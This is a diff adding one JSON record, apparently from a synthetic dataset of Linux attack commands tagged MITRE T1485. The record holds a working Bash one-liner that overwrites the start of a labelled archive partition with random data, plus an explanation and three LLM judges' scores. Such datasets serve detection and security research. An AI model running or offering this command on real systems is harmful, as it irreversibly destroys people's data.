@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1485",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'dev=$(blkid -L SECURE_ARCHIVE); [ -n \"$dev\" ] && { umount \"$dev\" 2>/dev/null || true; dd if=/dev/urandom of=\"$dev\" bs=1M count=16 oflag=direct status=progress; }'",
+  "explanation": "Corrupts a targeted encrypted/archive partition by overwriting the first 16 MiB, destroying critical metadata.",
+  "rationale_steps": [
+    "Resolve the device by label",
+    "Unmount to avoid active writes",
+    "Overwrite initial blocks where headers/metadata reside",
+    "Use random data for irreversible corruption"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-9214ae56-a111c1c9",
+  "source_prompt_hash": "9214ae56",
+  "timestamp_utc": "2025-09-30T07:55:14.956261Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed bash with balanced quotes and braces, proper test and grouping, and valid dd options.",
+        "semantic_score": 3,
+        "semantic_justification": "It correctly attempts to overwrite the first 16 MiB of the target device to corrupt metadata, but without elevated privileges the umount and dd operations will likely fail.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T01:46:06.544077Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, braces, and parentheses, proper use of command separators (&&, ;, ||), valid flags for blkid, umount, and dd, and correct bash -c quoting.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1485 by locating a partition by label (blkid -L), unmounting it, then overwriting the first 16 MiB with urandom using dd with direct I/O, which destroys filesystem metadata (superblock, partition table headers) and renders the archive unrecoverable, fully consistent with the claimed intent.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-19T01:41:16.969534Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses proper bash syntax, including conditional execution, subshells, and correctly formatted dd and blkid flags.",
+        "semantic_score": 5,
+        "semantic_justification": "The command correctly identifies a target by label, attempts to unmount it to avoid write locks, and uses dd to overwrite the beginning of the device, effectively destroying metadata and headers.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-19T01:41:27.254373Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
